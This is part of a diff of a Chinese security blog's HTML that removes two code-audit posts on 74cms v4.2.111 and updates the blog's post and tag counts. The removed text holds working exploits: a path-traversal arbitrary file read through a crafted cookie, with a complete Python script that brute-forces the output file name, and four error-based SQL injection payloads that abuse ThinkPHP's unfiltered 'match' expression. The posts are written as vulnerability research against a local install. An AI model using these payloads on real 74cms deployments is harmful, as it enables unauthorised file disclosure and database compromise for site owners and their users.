-<p>##<strong>1.基础知识:</strong><br>74cms是基于ThinkPHP3.2.3而建<br><code>Thinkphp</code>的一些基本操作可参考笔者以前的文章:<br><a href="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
-<p>##<strong>2.环境搭建:</strong><br><a href="http://www.74cms.com/download/index.html" target="_blank" rel="noopener">骑士官网</a>下载最新版本<code>74cms_v4.2.111</code>安装到本地即可。</p>
-<p>##<strong>3.漏洞利用:</strong><br>因为笔者是本地测试的,并没有开启短信服务,所以在这里先注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png" alt="image_1cpcbkt29r67qm81tiassp2ve25.png-75.4kB"></p>
-<p>这里我们以读取入口文件为例<br><strong>paylaod</strong>:</p>
-<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
-headers: Content-Type: application/x-www-form-urlencoded
-        X-Requested-With: XMLHttpRequest
-Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1
-POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind
-</code></pre><p>访问生成的特定<code>jpg</code>文件,下载到本地用编辑器打开即可看到<code>index.php</code>的内容<br><img src="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" alt="image_1cpc6ufrd7gugtklt11fud1lku9.png-72.6kB"></p>
-<p>##<strong>4.代码分析:</strong><br>这里只贴出相关代码。<br>1.根据<code>payload</code>定位到漏洞文件：</p>
-<pre><code>#upload\Application\Home\Controller\MembersController.class.php
-
-public function register(){
-    ...
-    if(IS_POST &amp;&amp; IS_AJAX){
-        $data[&apos;reg_type&apos;] =     
-        I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
-        $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
-        if($data[&apos;reg_type&apos;] == 1){//进入
-             //判断验证码
-        ...
-
-        if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
-            $uc_user = cookie(&apos;members_uc_info&apos;);
-            $data = array_merge($data,$uc_user);//合并数组
-
-            $passwordVerify = $data[&apos;password&apos;];
-        }
-        ...
-        if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
-            ...
-        if(&apos;bind&apos; == I(&apos;post.org&apos;,&apos;&apos;,&apos;trim&apos;) &amp;&amp; cookie(&apos;members_bind_info&apos;)){
-            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
-            $user_bind_info[&apos;uid&apos;] = $data[&apos;uid&apos;];
-            ...
-            $this-&gt;_save_avatar($user_bind_info[&apos;temp_avatar&apos;],$data[&apos;uid&apos;]);//临时头像转换
-            //跟进_save_avatar()函数
-</code></pre><p>跟进_save_avatar()函数:</p>
-<pre><code>#upload\Application\Home\Controller\MembersController.class.php
-protected function _save_avatar($avatar,$uid){
-    if(!$avatar) return false;
-$path = C(&apos;qscms_attach_path&apos;).&apos;avatar/temp/&apos;.$avatar;
-
-    $image = new \Common\ORG\ThinkImage();
-$date = date(&apos;ym/d/&apos;);
-
-    $save_avatar=C(&apos;qscms_attach_path&apos;).&apos;avatar/&apos;.$date;//图片存储路径
-    //data/upload/avatar/1810/09/
-    if(!is_dir($save_avatar)) mkdir($save_avatar,0777,true);
-    $savePicName = md5($uid.time()).&quot;.jpg&quot;;
-    $filename = $save_avatar.$savePicName;
-$size = explode(&apos;,&apos;,C(&apos;qscms_avatar_size&apos;));
-
-    copy($path, $filename);//漏洞触发点
-</code></pre><p>这里简单分析下代码:</p>
-<p><img src="http://static.zybuluo.com/chhyx/ggsy0ntyi0jzti5qrzxhdabl/image_1cpcb92na1lk3qso1ik1jdh41p1o.png" alt="image_1cpcb92na1lk3qso1ik1jdh41p1o.png-121.9kB"></p>
-<p>大家能看到最后一行有<code>unlink</code>操作,但是这里并不会造成任意文件删除 因为<code>$path</code>不是图片 <code>$image-&gt;open()</code>会报错,不过是存在任意图片删除的。</p>
-<p>2.这里漏洞的关键是在于<code>copy</code>操作的两个参数我们都可控,且没过滤../等敏感字符导致任意文件读取。</p>
-<p>3.我们理一下漏洞利用条件:</p>
-<pre><code>a.IS_POST &amp;&amp; IS_AJAX
-b.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2  //注册必要
-c.$ucenter == &apos;bind&apos;
-d.$org == &apos;bind&apos;
-e.cookie中含有members_bind_info字段且不为空
-</code></pre><p>4.解释下所用paylaod:</p>
-<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
-headers: Content-Type: application/x-www-form-urlencoded
-        X-Requested-With: XMLHttpRequest //满足AJAX操作
-Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1                        //读取的文件及上文e条件
-POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind //满足上文bcd条件
-</code></pre><p>5.py脚本:</p>
-<pre><code># -*- coding: utf-8 -*-
-#author: P0rZ9
-#env: python2
-
-import requests
-import hashlib
-import time
-
-url = &apos;http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register&apos;
-headers = {
-    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&apos;,
-    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
-    &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;
-}
-data = &apos;ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind&apos;
-cookies = {&apos;members_bind_info[temp_avatar]&apos;: &apos;../../../../index.php&apos;, &apos;members_uc_info[uid]&apos;: &apos;1&apos;}
-
-def copy_file():
-    re = requests.post(url,data=data,headers=headers,cookies=cookies)
-    print &apos;[-]file_copy_success&apos;
-
-def get_file_name():
-    state_time = &apos;%.0f&apos;%(time.time()-20)
-    for i in range(20):
-        pay_time = int(state_time) + i
-        img_url = &apos;http://127.0.0.1:84/data/upload/avatar/1810/09/%s&apos;%(md5_str(&apos;1&apos;+str(pay_time))+&apos;.jpg&apos;)
-        r = requests.get(img_url)
-        if &apos;No input file specified.&apos; not in r.text:
-            print &apos;[-]result_file:%s&apos;%img_url
-
-def md5_str(str):
-    h1 = hashlib.md5()
-    h1.update(str.encode(encoding=&apos;utf-8&apos;))  # 传入需要加密的字符串进行MD5加密
-    return h1.hexdigest() 
-
-def main():
-    copy_file()
-    get_file_name()
-
-main()
-</code></pre><p>成功截图:<br><img src="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png" alt="image_1cpcf5kaeh1h1lora691vfp12542i.png-207.8kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/08/74CMS_V4.2.111多处sql注入/" itemprop="url">代码审计 | 74CMS_V4.2.111多处SQL注入</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T12:15:41+08:00">
-                2018-10-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>漏洞的大致思路:</p>
-<pre><code>1.找到think_filter()漏掉的表达式match
-2.搜索用到where的参数可控的函数
- a.get post cookie header等接收的参数
- b.函数直接接收的参数 如  public function($id)
-3.用表达式构造sql语句
-</code></pre><hr>
-<p>##<strong>基础知识:</strong><br>总结一下在拿到一个基于TP框架开发的cms 审计流程是怎样的<br>这里以74cm最新版本<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_Home_Setup_v4.2.111</a>为例:<br>1.查看TP版本:</p>
-<pre><code>#upload\ThinkPHP\ThinkPHP.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/801cmnatics78bjp256lnu06/image_1cp969qp91hik13s31ua71t3a134e9.png" alt="image_1cp969qp91hik13s31ua71t3a134e9.png-23.6kB"><br>2.查看系统参数过滤情况:</p>
-<pre><code>#upload\applicaton\common\conf\config.php
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/mpakzoyvfnp4eecpbsgem1hg/image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png" alt="image_1cp96cpbe1fnq12uf1obr1sdt4dc1m.png-54.6kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/a036krjqziyp0q6fh9oikno5/image_1cp96prer19gn1n601jkuvocnje33.png" alt="image_1cp96prer19gn1n601jkuvocnje33.png-80.3kB"></p>
-<p>结果:使用I函数过滤的都会使用这三个函数进行过滤：</p>
-<pre><code>htmlspecialchars,stripslashes,strip_tags
-</code></pre><p>我们测试下基本的过滤规则:<br>在<code>upload\application</code>目录下新建<code>TestController.class.php</code>:</p>
-<pre><code>&lt;?php
-namespace Home\Controller;
-class TestController{
-
-function tt()
-{    
-    var_dump($_GET[&apos;id&apos;]);
-    var_dump(I(&apos;get.num&apos;,&apos;&apos;));
-}
-}
-</code></pre><p>访问:<code>http://127.0.0.1:84/index.php?m=Home&amp;c=Test&amp;a=tt&amp;id=2&#39;&quot;&lt;&gt;&amp;num=1&#39;&quot;&lt;&gt;</code><br>查看过滤信息 并未对单引号进行过滤<br><img src="http://static.zybuluo.com/chhyx/thfdp8xy6s1p42kn97offf37/image_1cp770ot51evk1n6h10fh1u2daa29.png" alt="image_1cp770ot51evk1n6h10fh1u2daa29.png-67.5kB"></p>
-<p>所有经过过滤的参数对value肯定是有过滤,但对key未进行过滤：<br><img src="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" alt="image_1cp773ng54rvi421e9og3g10okm.png-24.1kB"></p>
-<p>这里大概整理一下:<br>a.<code>_GET _POST _REQUEST _SERVER _FILES</code>系统无过滤<br>b.系统大部分使用的是<code>I</code>函数进行数据操作与过滤<br>c.调用<code>I</code>函数默认使用以下过滤规则:</p>
-<pre><code>a.将预定义字符`&amp; &quot; &apos; &lt; &gt;`转化为html实体 （单引号只有在设置ENT_QUOTES 才会转为实体）
-b.stripslashes() 函数删除由 addslashes() 函数添加的反斜杠
-c.strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签
-</code></pre><p>d.所有经过过滤的参数对value有过滤,但对key未进行过滤</p>
-<p>我们重点关注sql注入,可以知道并未对单引号进行过滤,所以我们可以</p>
-<pre><code>a.查找系统中拥有字符串拼接的地方
-b.查看是否有不使用I函数而带入数据库的 可进行框架注入
-</code></pre><p>3.如果有自带的get post cookie方法 查看其过滤规则</p>
-<p>更多基础知识请移步:<br><a href="http://static.zybuluo.com/chhyx/0lakimfywrv6vibn4y7xy9wv/image_1cp773ng54rvi421e9og3g10okm.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作</a></p>
-<p>##<strong>本地测试:</strong><br>1.开启debug+trace模式:<br>a.<code>upload\Application\Common\Conf\config.php</code>添加内容:</p>
-<pre><code>&apos;SHOW_PAGE_TRACE&apos;        =&gt;  true,
-</code></pre><p>b.在<code>upload\index.php</code>将<code>APP_DEBUG</code>设置为<code>true</code></p>
-<p>2.查看<code>I</code>函数的过滤情况:<br>这里的漏洞情况与笔者前几天分析的<a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">thinkphp5.0.10函数过滤不全导致一处盲注</a>思路类似,都是<code>I</code>函数用的过滤函数<code>think_filter()</code>过滤不全导致注入。</p>
-<p>think_filter():<br><img src="http://static.zybuluo.com/chhyx/kenyd6ju23x35t1zpnnkcver/image_1cp99h5raa7dr6hebthgk19388i.png" alt="image_1cp99h5raa7dr6hebthgk19388i.png-21.4kB"></p>
-<p>系统自带的表达式:<br><img src="http://static.zybuluo.com/chhyx/2rm44f6cgdjpupj9xft5k245/image_1cp99k0aj19jngo1vtt1sc51cffa2.png" alt="image_1cp99k0aj19jngo1vtt1sc51cffa2.png-17.6kB"></p>
-<p>这里漏掉了多个表达式<br>eq,is,is not,match,match_mode,match_with</p>
-<p>这里我们选取match进行利用,我们查看match相关的操作代码:</p>
-<p><img src="http://static.zybuluo.com/chhyx/sphmu2yx9iwyhfergt9m7q2d/48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png" alt="48b21d73-b2d1-4b7c-aa68-d5042a5315e0.png-16.8kB"></p>
-<p>要想构造sql注入,需要闭合前面的双引号,但是文章开头我们说了I函数的过滤规则是过滤双引号的,这时候我们就需要寻找一处不经过I函数的或不过滤双引号的地方来构造漏洞。</p>
-<p>测试代码:</p>
-<pre><code>#Application\Home\Controller\IndexController.class.php
-public function index($id){//直接接收的参数$id不经过I函数过滤
-M(&apos;test_user&apos;)-&gt;field(&apos;id,name&apos;)-&gt;where(array(&apos;id&apos; =&gt; $id))-&gt;find();
-        echo M(&apos;test_user&apos;)-&gt;getLastSql();
-</code></pre><p>payload:</p>
-<pre><code>http://127.0.0.1:84/index.php?m=home&amp;c=index&amp;a=index&amp;id[0]=match&amp;id[1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0)-- a
-</code></pre><p>利用:<br><img src="http://static.zybuluo.com/chhyx/4wga2ajqcvsn9itkplwlmcfn/image_1cp97gkt7g831hsb60ahpiigo3g.png" alt="image_1cp97gkt7g831hsb60ahpiigo3g.png-90.9kB"></p>
-<p>##<strong>漏洞利用:</strong><br>在74cms中寻找形如寻找形如<code>M()-&gt;where($id)--&gt;xx</code>,只要where中参数可控且不会过滤双引号即可。<br>我们在编辑器内搜索相关代码调试,得到4处可利用的点。</p>
-<p>1.<code>upload\Application\Home\Controller\AjaxPersonalController.class.php</code><br><code>$company_id</code> 函数直接接收的参数,不受过滤规则的约束,可控且无过滤</p>
-<pre><code>#AjaxPersonalController.class.php 137行
-public function company_focus($company_id){
-    if(!$company_id){
-        $this-&gt;ajaxReturn(0,&apos;请选择企业！&apos;);
-    }
-    $r = D(&apos;PersonalFocusCompany&apos;)-&gt;add_focus($company_id,C(&apos;visitor.uid&apos;));
-    $this-&gt;ajaxReturn($r[&apos;state&apos;],$r[&apos;msg&apos;],$r[&apos;data&apos;]);
-}
-</code></pre><p>跟进<code>add_focus()</code>函数:<br><img src="http://static.zybuluo.com/chhyx/9hfa3dlxobcwng3xz5r7kkn0/image_1cp8q661n1lqaeh516sebh1bqp2p.png" alt="image_1cp8q661n1lqaeh516sebh1bqp2p.png-68.2kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/605l40sydht50z29duok12zn/image_1cp8qpd2bf871bsa10431083p54d3.png" alt="image_1cp8qpd2bf871bsa10431083p54d3.png-310.8kB"></p>
-<p>2.<code>upload\Application\Home\Controller\CompanyServiceController.class.php</code></p>
-<pre><code>$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
-</code></pre><p><code>$order_id</code>函数直接接收的参数 不受过滤规则的约束<br>可控且无过滤</p>
-<pre><code>public function order_pay_finish($order_id){
-$order = D(&apos;Order&apos;)-&gt;where(array(&apos;id&apos;=&gt;$order_id))-&gt;find();
-    ...
-}
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/vogy2h9r4ttmtfm44urvgnfy/image_1cp8qjt291cs21urq1ohr1onmjivat.png" alt="image_1cp8qjt291cs21urq1ohr1onmjivat.png-91.4kB"></p>
-<p>3.<code>upload\Application\Home\Controller\MembersController.class.php</code></p>
-<pre><code>#MembersController.class.php 220行
-public function register(){
-        ...
-        if(IS_POST &amp;&amp; IS_AJAX){
-            $data[&apos;reg_type&apos;] = I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
-            $array = array(1 =&gt; &apos;mobile&apos;,2 =&gt; &apos;email&apos;);
-            $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
-
-            if($data[&apos;reg_type&apos;] == 1){//进入
-                $data[&apos;mobile&apos;] = I(&apos;post.mobile&apos;,0,&apos;trim&apos;);//注意
-                 //判断验证码
-            ...
-
-            if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
-                $uc_user = cookie(&apos;members_uc_info&apos;);
-                $data = array_merge($data,$uc_user);//合并数组
-
-                $passwordVerify = $data[&apos;password&apos;];
-            }
-            ...
-            // 若手机号重复且勾选了解绑原帐号
-            if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
-                $data[&apos;unbind_mobile&apos;] = I(&apos;post.unbind_mobile&apos;,0,&apos;intval&apos;);
-                if($data[&apos;unbind_mobile&apos;]){
-                    $repeat = M(&apos;Members&apos;)-&gt;where(array(&apos;mobile&apos;=&gt;$data[&apos;mobile&apos;]))-&gt;select();//漏洞触发点
-</code></pre><p>漏洞利用条件:</p>
-<pre><code>a.IS_POST &amp;&amp; IS_AJAX
-b.bind&apos; == $ucenter
-c.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2
-d.$data[&apos;unbind_mobile&apos;] 存在
-</code></pre><p>这里的漏洞参数<code>$data[&#39;mobile&#39;]</code> 是可控的<br>虽然<code>$data[&#39;mobile&#39;]</code>是I函数取值的,但是在下面<code>$data = array_merge($data,$uc_user);</code> 对<code>cookie</code>接收的参数进行了合并,这样我们就可以利用<code>cookie</code>方式来传递我们的sql语句来进行注入</p>
-<p>payload分析:</p>
-<pre><code>url:http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
-POST：ucenter=bind&amp;utype=2&amp;reg_type=1&amp;unbind_mobile=1 //满足bcd
-headers:Content-Type: application/x-www-form-urlencoded
-        X-Requested-With: XMLHttpRequest         //满足AJAX操作
-
-Cookie: members_uc_info[mobile][0]=match; members_uc_info[mobile][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a //注入利用
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/lxggkw9182tcrh3fb46vh5rb/image_1cp8u762a1mms1buc1l2bc851a4deg.png" alt="image_1cp8u762a1mms1buc1l2bc851a4deg.png-93.2kB"></p>
-<p>本地测试时,如无短信服务,我们可以注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/02de6ocyv7r4dhob382abr8l/image_1cp8ufiq5u431rsd1p1a3j11sjjet.png" alt="image_1cp8ufiq5u431rsd1p1a3j11sjjet.png-75.4kB"></p>
-<p>4.<code>upload\Application\Home\Controller\membercontroller.class.php</code></p>
-<pre><code>public function oauth_reg(){
-
-        if (cookie(&apos;members_bind_info&apos;)) {
-
-            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
-
-        }else{
-            $this-&gt;error(&apos;第三方授权失败，请重新操作！&apos;);
-        }
-        //第三方帐号绑定
-        $username = I(&apos;post.username&apos;,&apos;&apos;,&apos;trim&apos;);
-        $password = I(&apos;post.password&apos;,&apos;&apos;,&apos;trim&apos;);
-        $passport = $this-&gt;_user_server();
-        ...
-    }
-
-        else{//进入
-            $user = $passport-&gt;_user;//获取个人信息
-            ...//uid不可控 所以这里不可利用
-        }
-        ...
-        $info = M(&apos;MembersBind&apos;)-&gt;where(array(&apos;type&apos;=&gt;$user_bind_info[&apos;type&apos;],&apos;uid&apos;=&gt;$uid))-&gt;find();//触发点
-</code></pre><p>payload:</p>
-<pre><code>header：Content-Type: application/x-www-form-urlencoded
-       //表明提交的表单数据编码为键值对,用&amp;分隔
-
-Cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
-
-POST: username=test1&amp;password=test1  //注册账户 用户名:test1       密码:test1
-</code></pre><p>这里的<code>$user_bind_info</code>是用<code>cookie</code>方式直接传过来的 我们可控导致注入产生:<br><img src="http://static.zybuluo.com/chhyx/d2hpvua1m2jag632czdjhj3k/image_1cp903p10259b6p17d011omemhfa.png" alt="image_1cp903p10259b6p17d011omemhfa.png-92.9kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2442,7 +2511,7 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">51</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2455,7 +2524,7 @@ POST: username=test1&amp;password=test1  //注册账户 用户名:test1       �
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
